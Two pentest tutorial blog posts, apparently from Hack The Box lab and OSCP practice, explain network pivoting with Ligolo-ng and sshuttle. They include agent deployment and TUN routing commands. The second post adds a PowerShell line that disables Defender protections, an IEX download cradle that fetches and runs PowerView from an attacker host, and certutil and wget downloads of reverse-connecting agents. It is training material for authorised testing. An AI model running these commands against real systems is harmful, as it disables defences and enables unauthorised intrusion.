
##
#
https://dalemazza.github.io/blog/Ligolo-ng/
#
https://github.com/nicocha30/ligolo-ng
#
https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740
#
##

dalemazza's blog
Ligolo-ng - Pivot the right way
by dalemazzaDecember 20, 2022 4 min read



Recently I completed Dante which is a pro lab on hack the box. During this challenge lab there were several pivot points that gave you access to the internal network. My old method of using chisel here was really annoying me due to its limitations with using SOCKS. After some research I found these tools to be the best of both worlds.
Ligolo-ng
This a fantastic tool that creates a proxy tunnel on your TUN interface. Allowing you to pivot whilst maintaining all functionality of TCP/UDP etc. (LOOKING AT YOU SOCKS!). It uses an proxy server hosted on the attacking machine, then an agent placed onto the machine you need access from. Here is the link to its github.

Here are some benefits of the tool

Tun interface (No more SOCKS!)
Simple UI with agent selection and network information
Easy to use and setup
Automatic certificate configuration with Let’s Encrypt
Performant (Multiplexing)
Does not require high privileges
Socket listening/binding on the agent
Multiple platforms supported for the agent
sshuttle
This tool can create a proxy on connection via SSH. You simply specify the subnet you want tunneling to your host. This also avoids the need for SOCKS. Here is the link to its github.



The Goal
I want to access the file server located at 172.16.5.25. To achieve this I will have to do several pivots.



The set up
First of all let’s use my attacking machine on 10.10.14.10 and set up a tunnel to the 172.16.1.0/24 subnet.

sshuttle
Using previously obtained SSH credentials, I can use sshuttle to create a tunnel to this new subnet.

sshuttle -r USER@10.10.14.10 172.16.1.0/24

Now you will have access to this subnet. Here is what the current set up looks like.



Using this tunnel I can access the 172.16.1.14 machine. This machine has access to the 172.16.5.0/24 network. Lets use ligolo-ng to set up a tunnel for this.

Ligolo-ng
To use this program we need to set up a few things on the attackers machine in our instance its the 10.10.14.10 machine, these are as follows

# This will create a new TUN interface
sudo ip tuntap add user [your_username] mode tun ligolo
# This will set the link on yhe nee interface to up
sudo ip link set ligolo up
# This will add a route to the new tunnel.
# NOTE this is where you insert the new subnet you want to access.
sudo ip route add 172.16.5.0/24 dev ligolo
Next we just run the ./proxy script to run the proxy on our attacking machine. Please note for this I am using no encryption.

./proxy -selfcert

Now using access on the 172.16.1.14 I will deploy the agent

./agent -connect 10.10.14.10:11601 -ignorecert

Now switching back to the proxy server we can see the agent has established connection.

INFO[0102] Agent joined. name=WS-01 remote="172.16.1.14:38000"
On the proxy we now can select the session we want to interact with and then start the tunnel

ligolo-ng » session 
? Specify a session : 1 - WS-01 - 172.16.1.14:38000
# Next simply type start to start using the tunnel
[Agent : WS-01] » start
[Agent : WS-01] » INFO[0690] Starting tunnel to WS-01
Now we have access to the 172.16.5.0/24 subnet and our set up looks like this.



This is all fun and games but it seems the host 172.16.5.25 is only reachable via the 172.16.5.20 machine. In this set up we cannot hit the machine. Double pivot anyone??

Double pivot


In order for ligolo to know how to access this host we need to place a second agent on the .20 machine, doing this will allow the tunnel to see and know how to route traffic to the .25 machine. After starting the agent on the .20 with the same commands as above you will see the agent establish connection in the proxy server

Ligolo can only be tunneling from 1 session at a time. So we need to change to the new session and start the tunnel. Like so.

INFO[0102] Agent joined. name=DC-01 remote="172.16.5.20:27600"
[Agent : WS-01] » session 
? Specify a session : 2 - DC-01 - 172.16.5.20:27660
[Agent : DC-01] » start
? Tunnel already running, switch from WS-01 to DC-01? (y/N) Yes
INFO[0450] Closing tunnel to WS-01... 
[Agent : DC-01] » INFO[0450] Starting tunnel to DC-01   
Now you can SSH to the final host. The final set up will look like this.



It is worth noting that you can have as many agents deployed as you like and can simply switch the session and press start to switch to that tunnel to access the subnet you require.

Summary
Deploying and using pivots like above is an integral part of pen testing. Using the tools above make this as painless as possible while retaining full functionality on things like nmap script scans and more.

A point to note here if you do not have SSH for the initial pivot, simply just use a ligolo agent ;)

Hope you learnt something!


##
##


How to Tunnel and Pivot Networks using Ligolo-ng
Software Sinner
Software Sinner

·
Follow

6 min read
·
Jun 8, 2023
54


3





On my journey to take on the OSCP I learned that pivoting/tunneling can be a confusing concept at first for beginners. After doing extensive research I came across an awesome easy to use tool called Ligolo-ng. Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).


To follow this walkthrough or do some practicing I would recommend signing up with Hack The Box Pro labs. The pro labs have a lot of pivoting/tunneling involved that will help boost your comfort with these concepts and get you ready to take on the OSCP or real world pen tests.

Note: If you are a visual learner I would recommend this YouTube video I found very helpful :)


Step 1:

To start off you will need to download the agent and proxy files from the ligolo-ng releases page on github. The agent and proxy will depend on what system you are on and the system you are targeting. The agent will be ran on the target machine and the proxy tool will be ran on your machine.

Agent- Target machine

Proxy- Attacker machine (Yours)

Releases · nicocha30/ligolo-ng
An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface. - Releases · nicocha30/ligolo-ng
github.com

You can download them manually from the web interface or just grab them with the wget command in the current working directory you are in. I like to put all tools in my /opt directory with a designated folder for the tools.

cd /opt

mkdir ligolo

cd ligolo
Agent File:

sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
Proxy File:

sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
Now we need to unpack these files with the following commands and I recommend renaming them to the specific system you are going to use them on.

tar -xvf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz

ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz

sudo mv proxy lin-proxy

sudo mv agent lin-agent
Step 2:

There are some prerequisite commands we need to run before launching ligolo. These commands create a tun interface on the Proxy Server (C2).

sudo ip tuntap add user [your_username] mode tun ligolo

sudo ip link set ligolo up
On your machine get ligolo running:

./lin-proxy -selfcert -laddr 0.0.0.0:443 
Note: You can chose any port to listen on. I chose 443 because this port is known by most firewalls and wont get flagged.


Ligolo tool running
In another window once the above commands are all followed we need to push the agent file onto the target machine. You can accomplish this by running a python web server in the directory where the agent file resides.

sudo python -m http.server 80
Grab the agent file from the attacker machine using wget.

Run these commands on the Target Machine:

wget http://<your attacker machine IP here>/lin-agent

chmod +x lin-agent

./lin-agent -connect <attacker IP here>:443 -ignore-cert

Connection Established
You should see the connection get grabbed by the ligolo tool if the commands were ran successfully on target machine. You can manage your tunneled sessions in the tool by typing session in the above example screenshot and you can toggle between them once more are established. \

Step 3:

On the target machine if you enumerated you can discover other network interfaces the machine is interacting with or established connections to other internal IP’s. This will help us pivot to other networks and continue our attacks.

Run the following commands to discover other networks the machine is interacting with:

Linux Machine:

netstat -an

ip route

ifconfig

Target machine showing indicators of other networks
Now that we have the target network we want to pivot to in order to reach the other hosts and attack them lets add them to ligolo routes and start them.

On Attacker machine run:

sudo ip route add 192.168.110.0/24 dev ligolo

My routes for each machine compromised
Now you should be able to reach those other IP’s and perform attacks ;)

Step 4 (Next Pivot):

Let’s say we get a hold of a domain controller from carrying out our attacks from that subnet we pivoted to, and we notice now that this host is on Windows and is also communicating with another subnet after doing some enumeration. You can use some commands to enumerate and utilize powerview or winPEAS.

PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It contains a set of pure-PowerShell replacements for various windows “net *” commands, which utilize PowerShell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality.

PowerTools/powerview.ps1 at master · PowerShellEmpire/PowerTools
This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below…
github.com

Windows Machine:

netstat -an | findstr "192.168."
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
(New-Object System.Net.WebClient).DownloadString(‘http://<your IP Here>/powerview.ps1') | IEX
Get-NetForestTrust
We notice that a new subnet is being interacted with and new domain discovery after doing the above enumeration techniques.


Netstat output

Download the windows agent that matches your targets architecture in my case its 64-bit and then push it onto the machine the same way we did above but this time slightly different steps since this is a windows machine..

Release v0.4.3 · nicocha30/ligolo-ng
An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface. - Release v0.4.3 · nicocha30/ligolo-ng
github.com

On your attacker machine:

sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Windows_64bit.zip
You might already have your python web server still running from before so make sure you have the same file in the directory you are serving from.

sudo python -m http.server 80
On the Windows machine:

certutil.exe -urlcache -split -f "http://<Your IP Here>:80/win-agent.exe"

Now lets establish a connection with the agent:

./win-agent.exe -connect <your IP here>:443 -ignore-cert
You should see two sessions available now when running the session command in ligolo.


Now that we know the next IP route lets add it to ligolo and start it.

On your linux machine:

sudo ip route add 192.168.210.0/24 dev ligolo
You should see the following if command was added correctly..


Go back to your ligolo interface running and type session and select the machine with the new tunnel and type start. It will ask you if you want to switch tunnels just select yes..


You should now have learned how to pivot to two different networks. This process will be rinsed and repeated when seeing other machines on the network communicating to other subnets. You will push the agent file on the machine that is communicating with another network or domain and have it connect back to the ligolo interface then route that IP subnet with ligolo and type start.

I hope you found this walkthrough helpful please share with others and ensure to follow and comment if you have any questions!
